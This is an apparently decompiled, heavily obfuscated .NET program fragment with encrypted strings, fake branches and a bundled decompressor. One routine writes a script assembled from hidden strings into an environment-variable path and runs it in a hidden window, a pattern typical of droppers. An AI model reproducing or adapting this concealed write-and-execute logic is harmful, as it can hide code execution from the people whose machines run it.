				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 989:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_0087;
						case 6:
							goto IL_00ae;
						case 7:
							goto IL_00c5;
						case 8:
							goto IL_0125;
						case 9:
							goto IL_0130;
						case 10:
							goto IL_014a;
						case 11:
							goto IL_015a;
						case 12:
							goto IL_016f;
						case 13:
							goto IL_017f;
						case 14:
							goto IL_0199;
						case 15:
							goto IL_01a9;
						case 16:
							goto IL_01c3;
						case 17:
							goto IL_01d3;
						case 18:
							goto IL_01e8;
						case 19:
							goto IL_01f8;
						case 20:
							goto IL_022a;
						case 21:
							goto IL_0299;
						case 22:
							goto IL_02a9;
						case 23:
							goto IL_02c3;
						case 24:
							goto IL_02d3;
						case 25:
							goto IL_02e8;
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_02e8:
					num = 25;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047));
					goto IL_0034;
					IL_0034:
					num = 3;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(3960))) + Class32.smethod_0(3993);
					goto IL_005b;
					IL_005b:
					num = 4;
					text3 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0087;
					IL_0087:
					num = 5;
					File.Delete(text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(4490));
					goto IL_00ae;
					IL_00ae:
					num = 6;
					if (Class12.smethod_117(Class32.smethod_0(4485)))
					{
						goto end_IL_0000_3;
					}
					goto IL_00c5;
					IL_00c5:
					num = 7;
					streamWriter = new StreamWriter(text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(4536));
					goto IL_0125;
					IL_0125:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_0130;
					IL_0130:
					num = 9;
					streamWriter.Write(Class12.smethod_38(Class32.smethod_0(4545)));
					goto IL_014a;
					IL_014a:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_015a;
					IL_015a:
					num = 11;
					streamWriter.Write(Class32.smethod_0(4578));
					goto IL_016f;
					IL_016f:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_017f;
					IL_017f:
					num = 13;
					streamWriter.Write(Class12.smethod_38(Class32.smethod_0(4599)));
					goto IL_0199;
					IL_0199:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_01a9;
					IL_01a9:
					num = 15;
					streamWriter.Write(Class12.smethod_38(Class32.smethod_0(4720)));
					goto IL_01c3;
					IL_01c3:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_01d3;
					IL_01d3:
					num = 17;
					streamWriter.Write(Class32.smethod_0(4753));
					goto IL_01e8;
					IL_01e8:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_01f8;
					IL_01f8:
					num = 19;
					text4 = Class32.smethod_0(4762) + Class12.smethod_38(Class32.smethod_0(1169)) + Class12.smethod_38(Class32.smethod_0(1258));
					goto IL_022a;
					IL_022a:
					num = 20;
					streamWriter.Write(Class32.smethod_0(4779) + text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1374));
					goto IL_0299;
					IL_0299:
					num = 21;
					streamWriter.Write(Environment.NewLine);
					goto IL_02a9;
					IL_02a9:
					num = 22;
					streamWriter.Write(Class12.smethod_38(Class32.smethod_0(4720)));
					goto IL_02c3;
					IL_02c3:
					num = 23;
					streamWriter.Write(Environment.NewLine);
					goto IL_02d3;
					IL_02d3:
					num = 24;
					streamWriter.Write(Class32.smethod_0(4800));
					goto IL_02e8;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Interaction.Shell(text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(4536), (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 989;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_132(Class33.Class34 class34_0)
	{
		int int_ = class34_0.int_4;
		if (HOU2tiJgKu5JybMaDZ())
		{
		}
		int num = default(int);
		int num2;
		int num3;
		switch (2)
		{
		case 2:
			switch (int_)
			{
			case 2:
				break;
			case 3:
				goto IL_00d0;
			case 6:
				if (!Class12.smethod_139(class34_0.class38_0, class34_0.class35_0))
				{
					return false;
				}
				class34_0.class37_0 = Class12.smethod_82(class34_0.class38_0);
				class34_0.class37_1 = Class12.smethod_6(class34_0.class38_0);
				class34_0.int_4 = 7;
				goto case 7;
			case 7:
			case 8:
			case 9:
			case 10:
				return Class12.smethod_76(class34_0);
			default:
				return false;
			case 12:
				return false;
			case 4:
				goto IL_0161;
			case 5:
				goto IL_0187;
			}
			if (class34_0.bool_0)
			{
				class34_0.int_4 = 12;
				return false;
			}
			num = Class12.smethod_133(class34_0.class35_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class12.smethod_30(class34_0.class35_0, 3);
			goto case 12;
		case 0:
		case 5:
			class34_0.int_4 = 4;
			goto IL_0161;
		case 3:
			goto IL_0187;
		default:
			return false;
		case 7:
			return false;
		case 12:
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class34_0.bool_0 = true;
			}
			goto case 11;
		case 11:
			switch (num >> 1)
			{
			case 0:
				break;
			case 1:
				class34_0.class37_0 = Class33.Class37.class37_0;
				class34_0.class37_1 = Class33.Class37.class37_1;
				class34_0.int_4 = 7;
				goto IL_024d;
			case 2:
				class34_0.class38_0 = new Class33.Class38();
				class34_0.int_4 = 6;
				goto IL_024d;
			default:
				goto IL_024d;
			}
			Class12.smethod_157(class34_0.class35_0);
			goto case 1;
		case 1:
			class34_0.int_4 = 3;
			goto IL_024d;
		case 4:
		case 8:
		case 9:
		case 10:
		case 13:
			{
				bool result = default(bool);
				return result;
			}
			IL_00d0:
			if ((class34_0.int_8 = Class12.smethod_133(class34_0.class35_0, 16)) >= 0)
			{
				Class12.smethod_30(class34_0.class35_0, 16);
				goto case 0;
			}
			goto case 7;
			IL_0161:
			num2 = Class12.smethod_133(class34_0.class35_0, 16);
			if (num2 >= 0)
			{
				Class12.smethod_30(class34_0.class35_0, 16);
				class34_0.int_4 = 5;
				goto IL_0187;
			}
			goto default;
			IL_0187:
			num3 = Class12.smethod_21(class34_0.class36_0, class34_0.class35_0, class34_0.int_8);
			class34_0.int_8 -= num3;
			if (class34_0.int_8 == 0)
			{
				class34_0.int_4 = 2;
				return true;
			}
			return !class34_0.class35_0.IsNeedingInput;
			IL_024d:
			return true;
		}
	}

	static int smethod_133(Class33.Class35 class35_0, int int_0)
	{
		if (class35_0.int_2 < int_0)
		{
			if (!HOU2tiJgKu5JybMaDZ())
			{
				switch (3)
				{
				case 3:
					if (class35_0.int_0 != class35_0.int_1)
					{
						class35_0.uint_0 |= (uint)(((class35_0.byte_0[class35_0.int_0++] & 0xFF) | ((class35_0.byte_0[class35_0.int_0++] & 0xFF) << 8)) << class35_0.int_2);
						break;
					}
					goto case 0;
				case 0:
				case 1:
					return -1;
				case 5:
					goto IL_00b4;
				}
			}
			class35_0.int_2 += 16;
		}
		goto IL_00b4;
		IL_00b4:
		return (int)(class35_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_134(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class12.smethod_138(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static void smethod_135(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static short smethod_136(int int_0)
	{
		return (short)((Class33.Class40.byte_0[int_0 & 0xF] << 12) | (Class33.Class40.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class33.Class40.byte_0[(int_0 >> 8) & 0xF] << 4) | Class33.Class40.byte_0[int_0 >> 12]);
	}

	static void smethod_137(Class33.Class35 class35_0)
	{
		int num = 0;
		class35_0.int_2 = 0;
		int num2 = 0;
		class35_0.int_1 = 0;
		int num3 = 0;
		class35_0.int_0 = 0;
		class35_0.uint_0 = 0u;
	}

	static void smethod_138(Exception exception_0, object[] object_0)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains(Class32.smethod_0(4805)))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data[Class32.smethod_0(4805)] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data[Class32.smethod_0(4805)];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static bool smethod_139(Class33.Class38 class38_0, Class33.Class35 class35_0)
	{
		int num2 = default(int);
		while (true)
		{
			int int_ = class38_0.int_2;
			while (true)
			{
				IL_02b6:
				bool result;
				switch (int_)
				{
				case 2:
					class38_0.int_5 = Class12.smethod_133(class35_0, 4);
					goto IL_0102;
				case 3:
					if (class38_0.int_8 < class38_0.int_5)
					{
						num2 = Class12.smethod_133(class35_0, 3);
						if (num2 >= 0)
						{
							Class12.smethod_30(class35_0, 3);
							goto IL_0164;
						}
						goto IL_02ff;
					}
					class38_0.class37_0 = new Class33.Class37(class38_0.byte_0);
					class38_0.byte_0 = null;
					class38_0.int_8 = 0;
					class38_0.int_2 = 4;
					goto case 4;
				case 4:
				{
					int num3;
					while (((num3 = Class12.smethod_29(class38_0.class37_0, class35_0)) & -16) == 0)
					{
						class38_0.byte_1[class38_0.int_8++] = (class38_0.byte_2 = (byte)num3);
						if (class38_0.int_8 != class38_0.int_6)
						{
							continue;
						}
						goto IL_02fb;
					}
					if (num3 >= 0)
					{
						if (num3 >= 17)
						{
							class38_0.byte_2 = 0;
						}
						class38_0.int_7 = num3 - 16;
						goto IL_0221;
					}
					result = false;
					goto IL_0305;
				}
				case 5:
					while (true)
					{
						IL_0228:
						int int_2 = Class33.Class38.int_1[class38_0.int_7];
						int num = Class12.smethod_133(class35_0, int_2);
						if (num >= 0)
						{
							Class12.smethod_30(class35_0, int_2);
							while (true)
							{
								IL_00b3:
								num += Class33.Class38.int_0[class38_0.int_7];
								while (true)
								{
									if (num-- > 0)
									{
										class38_0.byte_1[class38_0.int_8++] = class38_0.byte_2;
										continue;
									}
									if (class38_0.int_8 != class38_0.int_6)
									{
										break;
									}
									result = true;
									if (!HOU2tiJgKu5JybMaDZ())
									{
										switch (16)
										{
										case 6:
											break;
										case 9:
										case 12:
											goto IL_00b3;
										case 10:
											goto IL_00ca;
										case 8:
											goto IL_0102;
										case 3:
										case 15:
											goto IL_011c;
										case 4:
											goto IL_0123;
										case 5:
											goto IL_0164;
										default:
											goto IL_017a;
										case 14:
											goto IL_0221;
										case 11:
											goto IL_0228;
										case 2:
											goto IL_02b6;
										case 0:
											goto IL_02ed;
										case 7:
											goto IL_02ff;
										case 13:
										case 16:
											goto IL_0305;
										}
										continue;
									}
									goto IL_017a;
								}
								break;
							}
							break;
						}
						goto IL_02ed;
						IL_02ed:
						result = false;
						goto IL_0305;
					}
					class38_0.int_2 = 4;
					break;
				case 1:
					class38_0.int_4 = Class12.smethod_133(class35_0, 5);
					if (class38_0.int_4 >= 0)
					{
						class38_0.int_4++;
						Class12.smethod_30(class35_0, 5);
						goto IL_00ca;
					}
					result = false;
					goto IL_0305;
				case 0:
					{
						class38_0.int_3 = Class12.smethod_133(class35_0, 5);
						if (class38_0.int_3 >= 0)
						{
							class38_0.int_3 += 257;
							Class12.smethod_30(class35_0, 5);
							class38_0.int_2 = 1;
							goto case 1;
						}
						result = false;
						goto IL_0305;
					}
					IL_017a:
					class38_0.int_8++;
					goto case 3;
					IL_0305:
					return result;
					IL_02fb:
					result = true;
					goto IL_0305;
					IL_0102:
					if (class38_0.int_5 >= 0)
					{
						class38_0.int_5 += 4;
						goto IL_011c;
					}
					result = false;
					goto IL_0305;
					IL_0221:
					class38_0.int_2 = 5;
					goto case 5;
					IL_011c:
					Class12.smethod_30(class35_0, 4);
					goto IL_0123;
					IL_0123:
					class38_0.byte_0 = new byte[19];
					class38_0.int_8 = 0;
					class38_0.int_2 = 3;
					goto case 3;
					IL_02ff:
					result = false;
					goto IL_0305;
					IL_00ca:
					class38_0.int_6 = class38_0.int_3 + class38_0.int_4;
					class38_0.byte_1 = new byte[class38_0.int_6];
					class38_0.int_2 = 2;
					goto case 2;
					IL_0164:
					class38_0.byte_0[Class33.Class38.int_9[class38_0.int_8]] = (byte)num2;
					goto IL_017a;
				}
				break;
			}
		}
	}

	static void smethod_140(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class12.smethod_138(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static int smethod_141(Class47.Struct22 struct22_0, Class47 class47_0)
	{
		string key = struct22_0.struct21_0.string_0.ToUpper();
		if (class47_0.dictionary_3.ContainsKey(key))
		{
			return class47_0.dictionary_3[key];
		}
		int count = class47_0.list_2.Count;
		class47_0.list_2.Add(struct22_0.struct21_0);
		class47_0.dictionary_3.Add(key, count);
		return count;
	}

	static void smethod_142(byte[] byte_0, int int_0, Class33.Class36 class36_0, int int_1)
	{
		if (class36_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_0 > 32768)
		{
			int_1 += int_0 - 32768;
			int_0 = 32768;
		}
		Array.Copy(byte_0, int_1, class36_0.byte_0, 0, int_0);
		class36_0.int_0 = int_0 & 0x7FFF;
	}

	static int smethod_143(int int_0, Graphics graphics_0, Font font_0, string string_0)
	{
		try
		{
			return Class12.smethod_110(string_0, int_0, graphics_0, font_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class12.smethod_8(int_0, graphics_0, font_0, string_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static void smethod_144(Class33.Class43 class43_0, int int_0, int int_1)
	{
		class43_0.uint_0 |= (uint)(int_0 << class43_0.int_2);
		class43_0.int_2 += int_1;
		if (class43_0.int_2 >= 16)
		{
			class43_0.byte_0[class43_0.int_1++] = (byte)class43_0.uint_0;
			class43_0.byte_0[class43_0.int_1++] = (byte)(class43_0.uint_0 >> 8);
			class43_0.uint_0 >>= 16;
			class43_0.int_2 -= 16;
		}
	}

	static void smethod_145(Class33.Class40.Class41 class41_0, Class33.Class40.Class41 class41_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class41_0.int_1)
		{
			int num3 = 1;
			int num4 = class41_0.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					class41_1.short_0[num4]++;
					if (HOU2tiJgKu5JybMaDZ())
					{
					}
					switch (3)
					{
					case 1:
					case 3:
						break;
					case 7:
						goto IL_0089;
					case 2:
						goto IL_00a9;
					case 4:
						goto IL_00d7;
					default:
						continue;
					}
					num3 = 0;
				}
			}
			num = num4;
			goto IL_0089;
			IL_0089:
			num2++;
			goto IL_00a9;
			IL_00d7:
			class41_1.short_0[16]++;
			continue;
			IL_00a9:
			while (num2 < class41_0.int_1 && num == class41_0.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				class41_1.short_0[num] += (short)num3;
				continue;
			}
			if (num == 0)
			{
				if (num3 <= 10)
				{
					class41_1.short_0[17]++;
				}
				else
				{
					class41_1.short_0[18]++;
				}
				continue;
			}
			goto IL_00d7;
		}
	}

	static void smethod_146(Class33.Class39 class39_0)
	{
		class39_0.int_0 |= 12;
	}

	static void smethod_147(EventArgs0 eventArgs0_0, Class47 class47_0)
	{
		Delegate19 delegate19_ = default(Delegate19);
		if (!HOU2tiJgKu5JybMaDZ())
		{
			switch (2)
			{
			case 0:
			case 2:
				delegate19_ = class47_0.delegate19_0;
				break;
			case 1:
			case 3:
				break;
			default:
				goto IL_0038;
			case 5:
				return;
			}
		}
		if (delegate19_ == null)
		{
			return;
		}
		goto IL_0038;
		IL_0038:
		delegate19_(class47_0, eventArgs0_0);
	}

	static void smethod_148()
	{
		try
		{
			Class28.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_149(Class33.Class43 class43_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class43_0.int_2 >= 8)
		{
			class43_0.byte_0[class43_0.int_1++] = (byte)class43_0.uint_0;
			class43_0.uint_0 >>= 8;
			class43_0.int_2 -= 8;
		}
		if (int_1 > class43_0.int_1 - class43_0.int_0)
		{
			int_1 = class43_0.int_1 - class43_0.int_0;
			Array.Copy(class43_0.byte_0, class43_0.int_0, byte_0, int_0, int_1);
			class43_0.int_0 = 0;
			class43_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class43_0.byte_0, class43_0.int_0, byte_0, int_0, int_1);
			class43_0.int_0 += int_1;
		}
		return int_1;
	}

	static void smethod_150(byte[] byte_0, short[] short_0, Class33.Class40.Class41 class41_0)
	{
		class41_0.short_1 = short_0;
		class41_0.byte_0 = byte_0;
	}

	static void smethod_151(int int_0, int int_1, Class33.Class35 class35_0, byte[] byte_0)
	{
		int num2 = default(int);
		if (class35_0.int_0 < class35_0.int_1)
		{
			int num = 5;
			if (!HOU2tiJgKu5JybMaDZ())
			{
				while (true)
				{
					switch (num)
					{
					default:
						num = 4;
						if (!HOU2tiJgKu5JybMaDZ())
						{
							continue;
						}
						goto case 0;
					case 0:
					case 5:
						throw new InvalidOperationException();
					case 1:
						break;
					case 3:
						goto IL_006a;
					case 6:
						goto IL_00ab;
					case 2:
					case 4:
						goto IL_00b4;
					}
					break;
				}
			}
		}
		else
		{
			num2 = int_0 + int_1;
		}
		if (0 <= int_0 && int_0 <= num2 && num2 <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				goto IL_006a;
			}
			goto IL_009d;
		}
		goto IL_00b4;
		IL_009d:
		class35_0.byte_0 = byte_0;
		class35_0.int_0 = int_0;
		goto IL_00ab;
		IL_006a:
		class35_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class35_0.int_2);
		class35_0.int_2 += 8;
		goto IL_009d;
		IL_00b4:
		throw new ArgumentOutOfRangeException();
		IL_00ab:
		class35_0.int_1 = num2;
	}

	static bool smethod_152(object[] object_0)
	{
		int num = 1;
		do
		{
			if (!Class12.smethod_48(object_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	static Assembly[] smethod_153(Class47 class47_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class12.smethod_77() };
		}
	}

	static string smethod_154()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return Class32.smethod_0(4057);
		}
	}

	static void smethod_155(Class55 class55_0)
	{
		try
		{
			Graphics val = ((Control)class55_0).CreateGraphics();
			try
			{
				string text = ((Control)class55_0).get_Text();
				int num = 4;
				if (!eDGT3VIwkRhN3e5ONQ())
				{
					goto IL_0048;
				}
				goto IL_004e;
				IL_004e:
				int num2 = default(int);
				switch (num)
				{
				case 0:
				case 4:
					break;
				case 3:
					goto IL_0024;
				default:
					goto IL_0048;
				case 5:
					((Control)class55_0).set_Height(num2);
					return;
				}
				goto IL_001d;
				IL_0048:
				if (num2 > 0)
				{
					num = 5;
					if (HOU2tiJgKu5JybMaDZ())
					{
						goto IL_001d;
					}
					goto IL_004e;
				}
				return;
				IL_001d:
				Font font = ((Control)class55_0).get_Font();
				goto IL_0024;
				IL_0024:
				int width = ((Control)class55_0).get_Width();
				num2 = Class12.smethod_143(width, val, font, text);
				goto IL_0048;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_156(Class56 class56_0)
	{
		while (class56_0 != null)
		{
			while (true)
			{
				IL_0055:
				Class56.class56_0 = class56_0;
				while (true)
				{
					AppDomain.CurrentDomain.UnhandledException += class56_0.method_1;
					Application.add_ThreadException((ThreadExceptionEventHandler)class56_0.method_0);
					if (!eDGT3VIwkRhN3e5ONQ())
					{
						break;
					}
					switch (5)
					{
					case 1:
					case 2:
						goto IL_0055;
					case 0:
					case 4:
						goto end_IL_0003;
					case 5:
						return;
					}
					continue;
					end_IL_0003:
					break;
				}
				break;
			}
		}
	}

	static void smethod_157(Class33.Class35 class35_0)
	{
		class35_0.uint_0 >>= class35_0.int_2 & 7;
		class35_0.int_2 &= -8;
	}

	static void smethod_158(Exception exception_0, object[] object_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class56.string_0 == Class32.smethod_0(871)) || !Class56.Handler.method_2((SecurityException)exception_0))
		{
			Class12.smethod_138(exception_0, object_0);
			Class56.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_159(IWebProxy iwebProxy_0, Class58 class58_0)
	{
		class58_0.iwebProxy_0 = iwebProxy_0;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_13([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_160(Form0 form0_0, ThreadStart threadStart_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_161(Class33.Class42 class42_0, byte[] byte_0)
	{
		class42_0.byte_1 = byte_0;
		class42_0.int_7 = 0;
		class42_0.int_8 = byte_0.Length;
	}

	static int smethod_162(Class33.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_163()
	{
		Process process = new Process();
		process.WaitForExit();
		if (!process.HasExited)
		{
			process.Kill();
		}
		string text = Class32.smethod_0(4830);
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class32.smethod_0(4843), Class32.smethod_0(1013)));
		objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class32.smethod_0(4900), Class32.smethod_0(1013)));
		string text2 = Class32.smethod_0(4830);
	}

	internal static bool eDGT3VIwkRhN3e5ONQ()
	{
		return true;
	}

	internal static bool HOU2tiJgKu5JybMaDZ()
	{
		return false;
	}
}
